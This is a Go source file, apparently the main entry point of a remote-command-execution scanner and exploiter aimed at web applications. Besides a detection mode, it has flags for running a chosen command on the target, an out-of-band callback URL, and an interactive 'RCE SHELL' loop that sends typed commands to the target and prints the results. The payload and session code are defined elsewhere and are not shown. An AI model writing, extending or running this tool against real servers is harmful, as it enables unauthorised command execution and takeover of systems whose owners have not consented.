package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
)

type Result struct {
	Vulnerable bool              `json:"vulnerable"`
	URL        string            `json:"url"`
	Parameter  string            `json:"parameter"`
	Method     string            `json:"method"`
	Payload    string            `json:"payload"`
	Command    string            `json:"command,omitempty"`
	Output     string            `json:"output,omitempty"`
	Confidence float64           `json:"confidence"`
	Engine     string            `json:"engine"`
	Technique  string            `json:"technique"`
}

func main() {
	url := flag.String("u", "", "Target URL")
	cmd := flag.String("c", "", "Command to execute (exploit mode)")
	data := flag.String("d", "", "POST data body")
	param := flag.String("p", "", "Specific parameter to test")
	method := flag.String("m", "GET", "HTTP method (GET/POST)")
	timeout := flag.Int("timeout", 10, "Request timeout in seconds")
	threads := flag.Int("t", 20, "Concurrent threads")
	proxy := flag.String("proxy", "", "HTTP proxy")
	cookie := flag.String("cookie", "", "Cookie header")
	userAgent := flag.String("ua", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "User-Agent")
	detect := flag.Bool("detect", false, "Run detection mode")
	exploit := flag.Bool("exploit", false, "Run exploit mode")
	blind := flag.Bool("blind", false, "Use blind/time-based detection only")
	all := flag.Bool("all", false, "Test all parameters")
	oobCallback := flag.String("oob", "", "OOB callback URL for blind detection")
	jsonOut := flag.Bool("json", false, "JSON output mode")
	verbose := flag.Bool("verbose", false, "Verbose output")
	tech := flag.String("tech", "", "Target technology (php,asp,jsp,node,python)")
	shell := flag.Bool("shell", false, "Start interactive shell session")
	delay := flag.Int("delay", 0, "Delay between requests (ms)")
	retries := flag.Int("retries", 1, "Retry count per payload")
	flag.Parse()

	if *url == "" {
		fmt.Fprintln(os.Stderr, `{"error":"target URL required (-u flag)"}`)
		os.Exit(1)
	}

	results := []Result{}

	if *shell {
		session := NewShellSession(*url, *data, *method, *param, *proxy, *cookie, *userAgent)
		fmt.Fprintf(os.Stderr, "[+] RCE SHELL ACTIVE — type 'exit' to quit\n")
		fmt.Fprintf(os.Stderr, "[+] Target: %s\n", *url)
		fmt.Fprintf(os.Stderr, "[+] Parameters: %v\n\n", session.Params())
		scanner := bufio.NewScanner(os.Stdin)
		for {
			fmt.Fprintf(os.Stderr, "$ ")
			if !scanner.Scan() {
				break
			}
			input := scanner.Text()
			if input == "exit" || input == "quit" {
				break
			}
			if input == "" {
				continue
			}
			output := session.Execute(input)
			if output != "" {
				fmt.Println(output)
			}
		}
		fmt.Fprintf(os.Stderr, "[!] Shell closed\n")
		return
	}

	commonOpts := CommonOptions{
		URL:       *url,
		Data:      *data,
		Method:    *method,
		Param:     *param,
		Timeout:   *timeout,
		Threads:   *threads,
		Proxy:     *proxy,
		Cookie:    *cookie,
		UserAgent: *userAgent,
		Blind:     *blind,
		All:       *all,
		OOB:       *oobCallback,
		Verbose:   *verbose,
		Tech:      *tech,
		Delay:     *delay,
		Retries:   *retries,
	}

	if *exploit || *cmd != "" {
		exploiter := NewExploiter(commonOpts)
		results = exploiter.Exploit(*cmd)
	} else {
		if !*detect && *cmd == "" {
			*detect = true
		}
		detector := NewDetector(commonOpts)
		results = detector.Scan()
	}

	if *jsonOut {
		b, _ := json.Marshal(results)
		fmt.Println(string(b))
		return
	}

	for _, r := range results {
		if r.Vulnerable {
			output := strings.ReplaceAll(r.Output, "\n", "\\n")
			if len(output) > 200 {
				output = output[:200]
			}
			fmt.Printf("VULNERABLE|%s|%s|%s|%.4f|%s\n", r.URL, r.Parameter, r.Technique, r.Confidence, output)
		} else {
			fmt.Printf("SAFE|%s|none|no_rce|0.0|Target appears secure\n", r.URL)
		}
	}

	if len(results) > 0 {
		vulnCount := 0
		for _, r := range results {
			if r.Vulnerable {
				vulnCount++
			}
		}
		if vulnCount > 0 {
			fmt.Printf("SUMMARY|%d parameter(s) vulnerable|RCE CONFIRMED\n", vulnCount)
		} else {
			fmt.Printf("SUMMARY|0 vulnerabilities|Target secure\n")
		}
	}
}
